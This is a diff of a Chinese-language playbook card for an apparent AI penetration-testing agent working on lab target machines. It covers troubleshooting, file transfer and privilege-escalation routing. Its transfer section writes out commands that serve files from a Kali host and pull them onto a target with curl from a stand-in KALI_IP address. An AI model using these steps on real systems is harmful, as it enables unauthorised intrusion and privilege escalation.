@@ -1,6 +1,6 @@
 ---
 name: 'blocking-points-detail'
-description: '阻断点细节归档：三问检查表/验证SOP/文件传输/提权优先级路由（AGENTS.md 精简后按需读取）'
+description: '阻断点细节归档：三问检查表/验证SOP/文件传输/提权优先级路由（按需读取）'
 disable-model-invocation: true
 metadata: { domain: meta, tier: T2 }
 ---
@@ -8,7 +8,7 @@ metadata: { domain: meta, tier: T2 }
 
 # 阻断点细节：三问检查 / 文件传输 / 提权优先级路由
 
-> AGENTS.md 精简后归档的详细内容。AGENTS.md 只留骨架，卡点详情查这里。
+> 高频查表/流程细节按需加载：T1 卡只留骨架指针，卡点详情查这里。
 
 ## 阻断点 3：方向对但操作不通 → 三问检查
 
@@ -86,13 +86,13 @@ metadata: { domain: meta, tier: T2 }
 
 ## 阻断点 3.5：文件传输 & 长脚本执行（Cohort 实战沉淀）
 
-> 本地 bash execute_command 有传输长度限制（Command too long）；PTY 里多行 heredoc 卡死。
+> 本地 bash bash 工具 有传输长度限制（Command too long）；PTY 里多行 heredoc 卡死。
 
 ### 传输（靶机无外网时）
 ```
 [1] Kali 起 HTTP: nohup python3 -m http.server <PORT> --directory /tmp >/dev/null 2>&1 &
 [2] 靶机下载: curl -s -o /tmp/x http://KALI_IP:PORT/x
-[3] 短文件 (<2KB): execute_command stdin 传 base64 → echo '<b64>' | base64 -d > /tmp/x
+[3] 短文件 (<2KB): bash 工具 stdin 传 base64 → echo '<b64>' | base64 -d > /tmp/x
 ```
 
 ### 执行
@@ -123,10 +123,10 @@ metadata: { domain: meta, tier: T2 }
 [3] 内核 CVE（最后 — 现代靶机通常已缓解/修复）
     → ls /etc/modprobe.d/disable-*.conf（存在 = 已知内核 CVE 已缓解）
     → unprivileged_userns_clone=0 → 需 userns 的内核漏洞不可用
-    → 内核版本对比: 发行版 security 页面修复版本（2026 LPE 清单见 memory: cohort-box）
+    → 内核版本对比: 发行版 security 页面修复版本（2026 LPE 清单见本机笔记）
 🔴 "内核全锁死" ≠ 提权结束 → 切回 [1] 用户态服务面
 🔴 部分升级 (同包族 lib 新 daemon 旧) = 漏洞窗口信号
 ```
 
-**Why:** AGENTS.md 精简（615→骨架）后，这些高频查表/流程细节仍需保留，按需读取比全量加载省上下文。
-**How to apply:** 遇到"操作不通/文件传不上/提权选路"时查本 memory；AGENTS.md 阻断点 1/3/3.5 只留指针。
+**Why:** 高频查表/流程细节保留在这张深卡里，按需读取比全量加载省上下文。
+**How to apply:** 遇到"操作不通/文件传不上/提权选路"时按名加载本卡；T1 卡只留指针。
